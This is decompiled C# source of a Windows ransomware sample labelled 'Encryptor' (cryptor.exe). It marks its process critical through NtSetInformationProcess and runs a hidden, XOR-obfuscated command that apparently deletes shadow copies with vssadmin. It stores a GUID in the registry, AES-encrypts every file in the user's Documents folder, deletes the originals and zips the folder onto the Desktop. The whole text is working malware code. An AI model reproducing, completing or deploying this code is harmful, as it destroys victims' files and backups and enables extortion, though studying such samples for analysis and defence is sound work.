// Decompiled with JetBrains decompiler
// Type: P82CEMnv2rbWVh6Z.Encryptor
// Assembly: Encryptor, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 63D84176-322B-4F05-A945-C547D946FA7C
// Assembly location: Z:\cryptor.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace P82CEMnv2rbWVh6Z
{
  internal class Encryptor
  {
    private static byte[] xor_key;
    private static string guid;

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    private static void Main(string[] args)
    {
      Encryptor.xor_key = Encoding.UTF8.GetBytes(args[0]);
      Process.EnterDebugMode();
      Encryptor.netsetinformationprocess_1();
      Encryptor.launch_cmd_vssadmin_shadow_delete();
      Encryptor.guid = Guid.NewGuid().ToString(); // d31dd518-8614-4162-beae-7a5a2ad86cc6
      Encryptor.setValueInRegistry(Encryptor.guid);
      Encryptor.enum_and_crypt_dir(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
      Encryptor.create_zip_yourdocuments();
      Encryptor.netsetinformationprocess_0();
    }

    private static void create_zip_yourdocuments() => ZipFile.CreateFromDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Personal), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + Encryptor.xor("HSoRAhh4Fz0SRg5aNzkZ"));

    private static void setValueInRegistry(string value) => Registry.SetValue(Encryptor.xor("CRg7LjVkJgAjdi1rBhg5PBw=") + Encryptor.xor("HQARER5QEiAUby5WOj8FCiFVBmAhXUY0Dy8TPRUdJAwlA0pyJCENHgVJLwUYXQdQLj4/CSpSBlk="), Encryptor.xor("FCMaFh5CODcI"), (object) value);

    private static string xor(string input, bool isBase64 = true)
    {
      byte[] numArray = !isBase64 ? Encoding.UTF8.GetBytes(input) : Convert.FromBase64String(input);
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < numArray.Length; ++index)
        stringBuilder.Append((char) ((uint) numArray[index] ^ (uint) Encryptor.xor_key[index % Encryptor.xor_key.Length]));
      return stringBuilder.ToString();
    }

    private static bool enum_and_crypt_dir(string docs)
    {
      foreach (string enumerateFile in Directory.EnumerateFiles(docs, "*", SearchOption.AllDirectories))
        Encryptor.crypt_file(enumerateFile, Encryptor.xor(Encryptor.guid, false));
      return true;
    }

    private static void netsetinformationprocess_1()
    {
      int processInformation = 1;
      Encryptor.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref processInformation, 4);
    }

    private static void netsetinformationprocess_0()
    {
      int processInformation = 0;
      Encryptor.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref processInformation, 4);
    }

    private static void launch_cmd_vssadmin_shadow_delete()
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = Encryptor.xor("Ij4aWQ9fFg=="),
        Arguments = Encryptor.xor("bjBeARlUEjYcWg0RPDUPWQpWHlkCUQgDCDkEDiEbdlEhAVIEbiILHg9T")
      };
      process.Start();
      process.WaitForExit();
    }

    private static byte[] crypto_random()
    {
      byte[] data = new byte[32];
      using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
      {
        for (int index = 0; index < 10; ++index)
          cryptoServiceProvider.GetBytes(data);
      }
      return data;
    }

    private static void crypt_file(string filename, string key)
    {
      byte[] buffer1 = Encryptor.crypto_random();
      FileStream fileStream1 = new FileStream(filename + Encryptor.xor("bzQWGBlT"), FileMode.Create);
      byte[] bytes = Encoding.UTF8.GetBytes(key);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 256;
      rijndaelManaged.BlockSize = 128;
      rijndaelManaged.Padding = PaddingMode.PKCS7;
      byte[] salt = buffer1;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 50000);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
      rijndaelManaged.Mode = CipherMode.CFB;
      fileStream1.Write(buffer1, 0, buffer1.Length);
      CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
      FileStream fileStream2 = new FileStream(filename, FileMode.Open);
      byte[] buffer2 = new byte[1024];
      try
      {
        int count;
        while ((count = fileStream2.Read(buffer2, 0, buffer2.Length)) > 0)
          cryptoStream.Write(buffer2, 0, count);
        fileStream2.Close();
      }
      catch (Exception ex)
      {
        return;
      }
      finally
      {
        cryptoStream.Close();
        fileStream1.Close();
      }
      File.Delete(filename);
    }
  }
}
